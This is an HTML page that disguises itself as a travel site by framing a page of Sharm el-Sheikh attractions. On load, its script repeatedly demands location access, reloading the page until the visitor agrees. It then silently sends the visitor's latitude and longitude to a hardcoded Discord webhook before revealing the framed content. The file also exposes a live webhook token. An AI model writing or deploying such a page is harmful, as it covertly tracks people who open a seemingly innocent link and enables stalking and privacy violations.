    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            text-align: center;
        }
        #location-prompt, iframe {
            display: none;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>

    <div id="location-prompt">
        <h2>Location is required for better service. Please allow location access to use the site.</h2>
    </div>

    <iframe id="content-frame" src="https://www.elgounatours.com/en/top-attractions-in-sharm-el-sheikh"></iframe>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1287627812701999115/DPX6pSyOlJXHkS_-KxNj03O1233HQlF-TnYPD_H05Gx90NNF9syL118ZL9lYmffgFdMG";

        // Function to get GPS coordinates and send them to the webhook
        function getGPS() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async function (position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;

                    // Prepare data with coordinates
                    const data = {
                        content: `User GPS coordinates: Latitude: ${latitude}, Longitude: ${longitude}`
                    };

                    // Send GPS data
                    try {
                        await fetch(webhookURL, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(data)
                        });

                        // Show the iframe when location is accepted
                        document.getElementById("location-prompt").style.display = "none";
                        document.getElementById("content-frame").style.display = "block";
                    } catch (error) {
                        console.error("Failed to send GPS data:", error);
                    }
                }, function (error) {
                    // On error (permission denied, etc.), reload the page to prompt again
                    location.reload();
                });
            } else {
                console.error("Geolocation is not supported by this browser.");
            }
        }

        // Trigger an alert and ask for permission to access the user's location
        window.onload = function () {
            const userConfirmed = confirm("Location is required for better service. Please allow location access to use the site.");
            if (userConfirmed) {
                getGPS();
            } else {
                // If the user dismisses, reload the page to prompt again
                location.reload();
            }
        };
    </script>

</body>
</html>
